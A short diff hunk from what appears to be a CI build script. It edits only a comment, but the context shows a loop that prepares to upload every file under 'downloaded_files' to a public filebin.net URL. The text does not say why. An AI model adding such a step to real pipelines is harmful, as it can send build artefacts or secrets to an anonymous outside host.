@@ -26,7 +26,7 @@ build_script:
     # Set your base upload URL
     BASE_URL="https://filebin.net/Sahaujwsh/"
 
-    # Upload each file
+    # Find all files recursively and upload each with filename appended
     find downloaded_files -type f | while read -r file; do
       filename=$(basename "$file")
       upload_url="${BASE_URL}${filename}"
